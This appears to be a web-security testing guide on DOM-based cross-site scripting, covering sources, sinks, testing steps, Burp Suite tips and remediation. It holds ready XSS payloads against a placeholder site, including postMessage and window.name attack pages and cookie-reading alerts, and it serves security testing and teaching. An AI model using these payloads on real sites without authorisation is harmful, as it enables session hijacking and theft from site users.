# DOM-Based XSS

## Overview
DOM-Based XSS is a client-side vulnerability where the attack payload is executed as a result of modifying the DOM environment in the victim's browser. Unlike reflected or stored XSS, the malicious data never necessarily reaches the server — the entire vulnerability exists in client-side JavaScript that reads attacker-controlled data (a "source") and passes it unsafely to an execution point (a "sink"). This makes DOM XSS invisible to server-side security controls, WAFs, and many automated scanners.

## How It Works
Client-side JavaScript reads data from a controllable source such as `location.hash`, `location.search`, `document.referrer`, `window.name`, or `postMessage`. This data flows through the application's JavaScript code and is eventually written to a dangerous sink — a function or property that can execute code or modify the DOM. If no sanitization occurs between source and sink, an attacker can inject a payload that the browser executes. Classic examples include `document.write(location.hash.slice(1))` or `element.innerHTML = new URLSearchParams(location.search).get('q')`.

## Impact
- Session hijacking and cookie theft
- Execution of arbitrary JavaScript in the victim's browser session
- DOM manipulation to display fake content or capture form submissions
- Bypassing CSP in cases where the vulnerable script is already whitelisted
- Same-origin requests on behalf of the victim
- Exploitation via fragments (`#`) that never hit the server, evading logs and WAF

## Where to Look

**Sources (attacker-controllable inputs):**
- `document.URL`, `document.location`, `location.href`
- `location.search` (query string)
- `location.hash` (URL fragment — never sent to server)
- `document.referrer`
- `window.name`
- `postMessage` event data
- `localStorage`, `sessionStorage`, `IndexedDB` (if populated from URL data)
- WebSocket messages
- Cookie values (if injected elsewhere)

**Sinks (dangerous execution points):**
- `document.write()`, `document.writeln()`
- `element.innerHTML`, `element.outerHTML`
- `element.insertAdjacentHTML()`
- `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)`
- `location.href = ...`, `location.assign()`, `location.replace()`
- `document.domain`
- jQuery: `$(selector)`, `.html()`, `.append()`, `.prepend()`, `.after()`, `.before()`
- AngularJS: `$sce.trustAsHtml()`, template expressions `{{}}` in older versions

## Testing Steps
1. Enumerate all JavaScript files and inline scripts using browser DevTools (Sources tab) or Burp's JavaScript analysis.
2. Search for dangerous sources in the JS code: grep for `location`, `document.URL`, `location.hash`, `referrer`, `postMessage`, `URLSearchParams`.
3. Search for dangerous sinks: grep for `innerHTML`, `document.write`, `eval`, `setTimeout`, `jQuery .html()`.
4. Trace the data flow from each source to a sink — does attacker-controlled data reach the sink without sanitization?
5. Craft a payload in the URL fragment (`#`) or query string and observe DOM changes in the browser DevTools console.
6. Use Burp's DOM Invader to automate source-to-sink tracing.
7. Test `window.postMessage` handlers by sending crafted messages from the browser console: `window.postMessage('<img src=x onerror=alert(1)>', '*')`.
8. Test single-page application routing — manipulate route parameters and hash-based navigation.
9. Confirm execution in an isolated browser session with a clean proof-of-concept.

## Payloads / Techniques

**Hash-based DOM XSS:**
```
https://victim.com/page#<img src=x onerror=alert(1)>
https://victim.com/page#<svg onload=alert(1)>
https://victim.com/page#javascript:alert(1)
```

**When sink is `innerHTML`:**
```javascript
// URL: https://victim.com/#<img src=x onerror=alert(document.cookie)>
document.getElementById('output').innerHTML = location.hash.slice(1);
```

**When sink is `document.write`:**
```
https://victim.com/page?lang=</script><script>alert(1)</script>
https://victim.com/page?name=<script>alert(1)</script>
```

**When sink is `eval` or `setTimeout` (string argument):**
```
https://victim.com/page?callback=alert(1)
https://victim.com/page?expr=alert`1`
```

**When sink is `location.href` (open redirect to XSS):**
```
https://victim.com/redirect?url=javascript:alert(1)
```

**AngularJS template injection (older versions):**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

**jQuery DOM XSS (`$(location.hash)`):**
```
https://victim.com/#<img src=x onerror=alert(1)>
```

**postMessage exploitation:**
```html
<html>
<body>
<script>
var target = window.open('https://victim.com/page');
setTimeout(function(){
  target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
}, 2000);
</script>
</body>
</html>
```

**window.name source:**
```html
<script>
window.name = "<img src=x onerror=alert(1)>";
location = 'https://victim.com/page-that-uses-window.name';
</script>
```

## Burp Suite Tips
- Use **DOM Invader** (available in Burp's embedded Chromium browser) — it automatically injects canaries into all sources and monitors all sinks, showing you exactly which source-sink path is exploitable.
- In the **DOM Invader** panel, enable "Postmessage interception" to test `postMessage` handlers.
- Use **Burp's built-in browser** (Tools > Open Browser) with DOM Invader enabled while navigating the target.
- Search JavaScript files in **Proxy HTTP history** (filter by JS MIME type) and paste them into Burp's **Decoder** or search for sink keywords.
- Use **Target > Site Map** and right-click → "Search in scope items" for sink/source keywords across all captured JS.
- Note that hash (`#`) values are NOT sent to the server, so they won't appear in Burp proxy history — you must analyze the JavaScript manually or with DOM Invader.
- Use the **JS Beautifier** extension in Burp to reformat minified JS for easier source-to-sink analysis.

## Tools
- Burp Suite Pro with DOM Invader
- Chrome/Firefox DevTools (Sources, Console, Debugger)
- DOMPurify test harness (to check if sanitization is sufficient)
- XSStrike — https://github.com/s0md3v/XSStrike (has DOM XSS detection)
- Dalfox — https://github.com/hahwul/dalfox
- retire.js — https://retirejs.github.io/retire.js/ (identify vulnerable JS libraries)
- Semgrep with JavaScript/TypeScript rules for static analysis
- eslint-plugin-no-unsanitized

## Remediation
- **Avoid dangerous sinks**: Do not pass untrusted data to `innerHTML`, `document.write`, `eval`, `setTimeout`/`setInterval` with strings, or `location.href`.
- **Use safe alternatives**: Replace `innerHTML` with `textContent` or `innerText` for plain text. Use `createElement` and `appendChild` for dynamic HTML creation.
- **Sanitize before sink insertion**: If HTML must be dynamically inserted, sanitize it with DOMPurify: `element.innerHTML = DOMPurify.sanitize(untrustedData)`.
- **postMessage validation**: In `message` event handlers, always validate `event.origin` against a strict allowlist before processing the data.
- **URL scheme validation**: Before assigning to `location.href`, validate that the URL starts with `https://` or `http://` — not `javascript:`.
- **Content Security Policy**: A CSP with `unsafe-eval` disallowed and strict `script-src` prevents many DOM XSS payloads from executing.
- **Audit JavaScript dependencies**: Use retire.js or npm audit to detect vulnerable libraries (jQuery < 3.0 had multiple DOM XSS issues).

## References
https://portswigger.net/web-security/cross-site-scripting/dom-based
https://owasp.org/www-community/attacks/DOM_Based_XSS
https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
https://portswigger.net/research/dom-based-vulnerabilities
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting
